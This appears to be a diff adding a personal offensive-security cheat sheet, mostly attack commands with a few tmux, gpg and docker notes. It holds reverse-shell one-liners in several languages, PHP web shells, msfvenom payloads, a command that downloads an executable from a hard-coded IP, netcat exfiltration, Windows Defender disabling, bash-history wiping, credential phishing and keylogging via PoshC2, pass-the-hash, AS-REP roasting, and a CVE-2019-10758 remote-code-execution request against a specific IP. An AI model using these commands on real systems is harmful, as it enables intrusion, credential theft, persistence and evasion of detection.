@@ -1,0 +1,421 @@
+
+Tmux
+start a new session
+tmux new -s my_session
+detach from the session
+Ctrl-b + d
+reattach to the Tmux session
+tmux attach-session -t my_session
+split screen horizontally
+Ctrl-b + "
+split scren vertically
+Ctrl_b + %
+scroll
+Ctrl-b + pg up
+press q to exit scroll mode
+
+PoshC2
+Install-Persistence 2,3
+Get-Keystrokes
+Cred-Popper
+cred-popper -title "0metalab Domain" -caption "Network session with server 0METALABDC01 expired. Please re-authenticate session."
+get-screenshotallwindows
+Get-CreditCardData -Path "C:\"
+Get-WLANPass
+Invoke-Pipekat -Username Admin -Password Password1 -Domain .
+Get-GPPPassword
+Bypass-UAC
+invoke-allchecks
+hashdump
+Add Autorun
+Add-autorun <task>
+List Autorun
+List-autorun
+Del Autorun
+Del-autorun <taskID>
+Nuke Autorun
+Nuke-autorun
+
+Android
+msfvenom –p android/meterpreter/reverse_tcp LHOST=ipaddress LPORT=4444 > hack.apk
+
+Empire
+bypassuac sentinel
+EMpire persistence
+usemodule persistence/userland/schtasks
+set DailyTime 09:00
+
+usemodule peristence/
+
+
+CLEAR BASH HISTORY
+cat /dev/null > ~/.bash_history && history -c && exit
+
+INTENSE SCAN ALL TCP PORTS
+nmap -p 1-65535 -T4 -A -v
+
+Pop3 bruteforce msf module
+auxiliary/scanner/pop3/pop3_login
+
+Openvpn
+openvpn --auth-nocache --config 0xskywalker.ovpn
+
+
+New-Object System.Net.WebClient.DownloadFile("http://23.239.22.46/Posh32.exe", "C:\Users\Adam Smith\AppData\Local\windrive.exe")
+(New-Object System.Net.WebClient).DownloadFile($url, $output)
+
+PGP
+gen key
+gpg --gen-key
+export your pub pgp key
+gpg --output ~/mykey.key --armor --export <uid>
+export your priv key
+gpg --output ~/privkey.pgp --armor --export-secret-key <uid>
+import a person's pub pgp key
+gpg --import key.asc
+decrypt a message
+gpg --decrypt --output decrypted message2bedecrypted
+encrypt a message
+gpg --encrypt --sign --armor -r person@email message
+delete a priv key
+gpg --delete-secret-keys <uid>
+delete a pub key
+gpg --delete-key <uid>
+
+Use ssh tunnel as socks proxy
+>ssh -D 8888 ipaddress
+>ssh -D 8888 -f -C -q -N ipaddress
+>change browser settings to 127.0.0.1:8888 socks5
+
+
+dirb http:// -w -X .php,.asp,.html,.aspx -o dirb.txt
+
+Nmap vuln
+nmap --script nmap-vulners -sV -p- 
+nmap --script vulscan -sV -p-
+nmap --script nmap-vulners,vulscan -sV -p-
+
+Sharefolder with host os
+mount -t vboxsf KaliBackup ~/foldertoshare/
+Unmount
+umount -t vboxsf KaliBackup ~/foldershared/
+
+Run tor
+sudo -u toruser -H torbrowser-launcher
+Incase of torbroswerllauncher error
+xhost si:localuser:toruser
+
+Run a Docker image
+docker run -i -t 8dbd9e392a96 /bin/bash
+Commit changes
+>docker ps -l
+>docker commit <containerid> newname/newname
+
+PHP
+<?php passthru($_REQUEST['cmd']); ?>
+<?php system($_GET['cmd']); ?>
+<?php echo exec($_POST['cmd']); ?>
+
+PHP preg_replace()
+https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace
+
+Dir Traversal
+curl --path-as-is -s -k "https://url"
+
+View Priviledges Information(Windows)
+whoami /priv
+
+LDAP
+https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap/comment-page-1/
+https://www.hackingloops.com/penetration-testing-for-ldap-injection-vulnerability/
+
+LDAP Enumeration
+nmap -p 389 --script ldap-search 10.10.10.161
+ldapsearch -x -b "CN=Users,DC=htb,DC=local" -H "ldap://10.10.10.161:389"
+
+Hydra
+hydra -L users.txt -P pass.txt 10.10.10.184 ssh
+hydra -L users.txt -P pass.txt 10.10.10.184 <protocol>
+
+
+Kerberoasting
+https://www.tarlogic.com/en/blog/how-to-attack-kerberos/
+
+ASREPRoast attack
+request SPN
+./GetNPUsers.py htb.local/
+get asreproast hashes
+./GetNPUsers.py htb.local/ -request
+or
+/GetNPUsers.py MEGABANK/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast
+
+SharpHound
+powershell import-module SharpHound.ps1; Invoke-BloodHound -CollectionMethod All -ldapuser <user> -ldappass <pass>
+
+Escalating privileges with ACLs in Active Directory
+https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/
+
+PowerView
+PS>Import-Module .\PowerView.ps1
+PS>Get-NetComputer
+replace "get-netcomputer" with cmdlet
+
+Pass the hash
+./psexec.py -hashes :xxxxxx username@domain
+
+RPC
+rpcclient -U "" <ip>
+RID Cycling
+lsaenumsids
+lookupsids <sid>
+
+
+
+SMB
+list shares
+smbclient -L //<ip>
+null login
+smbclient -N //<ip>
+
+SMB Enumeration
+ls /usr/share/nmap/scripts/ | grep "smb-vuln"
+
+DNS
+find domain
+dig @<ip> -x <ip>
+zone transfer
+dig axfr <domain> @<ip>
+
+Docker registry doc
+https://docs.docker.com/registry/spec/api/
+
+Copy from host to docker
+docker cp foo.txt mycontainer:/foo.txt
+Copy from docker to host
+docker cp mycontainer:/foo.txt foo.txt
+
+Copy from host to remote ssh machine
+scp file.txt remote_username@ipaddress:/remote/directory
+Copy to host from ssh machine
+scp remote_username@ipaddress:/remote/file.txt /local/directory
+
+MongoDB
+https://dzone.com/articles/mongodb-commands-cheat-sheet-for-beginners
+
+NoSQL Injection
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
+
+OSINT of an email address
+curl emailrep.io/target@domain.com
+
+Masscan
+masscan -p8983 --range 0.0.0.0/0 --banners --rate 100000000 -oG masscanips
+masscan --udp-ports 161
+grep ipaddresses with regex
+grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' file.txt
+grep -oP '(?<=Host: )\S*' file
+
+
+MySQL
+Count
+select tavle_name, table_rows from information_schema.tables where table_schema = '<db name>'
+
+Remote mysql
+sqlmap -d 'mysql://username:password@ipaddress:3306/dbname'
+
+Mail
+smtp
+>telnet smtp.domain.tld 587
+>EHLO domain.tld
+>AUTH LOGIN
+>base64encodedusername
+>base64encodedpass
+
+
+openssl s_client -connect mail.com:993 -crlf
+login
+tag login emailaddress password
+list mail folders
+tag LIST "" "*"
+select inbox
+tag SELECT INBOX
+fetch mail body
+tag FETCH id (BODY)
+fetch mail content
+tag FETCH id (BODY[TEXT])
+
+Mount VHD
+mount //10.10.10.134/Backups <smb_mountpoint>
+modprobe nbd max_part=16
+qemu-nbd --read-only --format=vpc -c /dev/nbd0 /mnt/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
+partprobe /dev/nbd0
+mount -o allow_other /dev/nbd0p1 <vhd_mountpoint>
+
+Dump SAM
+samdump2 SYSTEM bootkey
+
+DISABLE WINDEFEND 
+>powershell Set-MpPreference -DisableRealtimeMonitoring $true
+
+
+Powershell enumeration
+switch to english
+>chcp 437
+view priv
+>whoami /all
+>whoami /priv
+view hidden dir & files
+>ls -force
+process
+>get-process
+listening ports
+>netstat -aon | find /i "listening"
+tasklist
+>tasklist
+find a file
+>Get-ChildItem C:\ -name -recurse *filename
+download remote powershell script
+>powershell IEX (New-Object Net.WebClient).DownloadString('http://address')
+turn off win defend
+Set-MpPreference -DisableRealtimeMonitoring $true
+turn on win defend
+Set-MpPreference -DisableRealtimeMonitoring $false
+
+Compile c#
+mcs -out:ponytail2.exe ponytail.cs
+
+Schtasks
+schtasks /create /SC DAILY /TN "FOLDERPATH\TASKNAME" /TR "C:\SOURCE\FOLDER\APP-OR-SCRIPT" /ST HH:MM
+
+SCheduledtask
+$A = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\temp\pentestlab.exe"
+$T = New-ScheduledTaskTrigger -AtLogOn -User "pentestlab
+Register-ScheduledTask -TaskName "SoftwareScan" -Trigger $T -User "username" -Action $A
+
+Pass the hash
+python psexec.py -hashes :thehash username@ipaddress
+
+Socat redirector
+sudo socat TCP4-LISTEN:listeningport,fork TCP4:c2ipaddress:c2port
+
+Exfil with Netcat
+create listener on receiver
+nc -l -p 1234 > /tmp/py.py
+send
+nc -w 3 receiverip 1234 < py.py
+
+Reverse shell
+bash
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+0<&196;exec 196<>/dev/tcp/<your IP>/<same unfiltered port>; sh <&196 >&196 2>&196
+socat
+user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
+user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4242
+python
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+php
+php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+netcat
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4444 >/tmp/f
+powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+Transfer binary with base64
+$ base64 <binary>
+copy and paste to box as binary.b64
+$ base64 -d binary.b64 > binary
+$ chmod +x binary
+
+SSH Tunneling
+ssh -nNT -L 1337:127.0.0.1:1337 -i k.backup kaneki@ghoul.htb
+SSH Double Tunneling
+Connect to remote host via Aogiri
+kaneki@Aogiri:~$ ssh -nNT -L 127.0.0.1:1337:172.18.0.2:3000 kaneki_pub@172.20.0.150
+Connect to remote host via localhost
+root@kali:~/HTB/Ghoul# ssh -nNT -L 1337:127.0.0.1:1337 -i k.backup kaneki@ghoul.htb
+
+
+DnsAdmins to SYSTEM
+>whoami /all
+>dnscmd /config /serverlevelplugindll \\10.10.16.55\www\wlbsctrl.dll
+>sc stop dns
+>sc start dns
+
+msfvenom x64
+msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows lhost=ipaddr lport=4444
+
+Compile cpp with no metadata
+g++ script.cpp -o binary.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
+
+LINUX PRIV ESC
+System/User info:
+uname -a
+env
+whoami
+history
+pwd
+
+Coomand history?
+cat .bash_history
+
+Who else has logged in?
+who
+w
+last
+
+Are you in the sudoers file:
+sudo -l
+cat /etc/sudoers
+
+Other super users?:
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1 }'
+
+Network info:
+ifconfig -a
+Active internet connections
+netstat -antup
+lsof -i
+
+Get kernel version:
+uname -a
+
+Search for priv esc exploit
+searchsploit <kernel&version> | sort -n
+
+Enumerate services/software?:
+ps aux
+ps -ef
+
+SUID Files?:
+find / -perm -u=s -type f 2>/dev/null
+
+GUID Files::
+find / -perm -2000 -type f 2>/dev/null
+
+Password hashes?:
+cat /etc/shadow
+
+Check jobs/task:
+ls -la /etc/cron*
+
+SSH Keys:
+ls -la ~/.ssh/
+
+Look for cleartext creds in files for various scripts, DB's, config files, etc..
+find . type f -maxdepth 4 | xargs grep -i "password"
+
+cat /proc/version 	Kernel information
+cat /etc/*-release 	Distribution information
+cat /etc/issue 	As above
+cat /proc/cpuinfo 	CPU information
+df -a 	File system information
+
+find / -perm -2 -type f 2>/dev/null   Find word-writeable directories 
+
+ls -la /root/.*_history 	Can we read root’s history files
+
+ps aux | grep root 	View services running as root
+
+
+CVE-2019-10758
+curl 'http://18.237.96.14:8081/checkValid' -H 'Authorization: Basic YWRtaW46cGFzcw=='  --data 'document=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("calc.exe")'
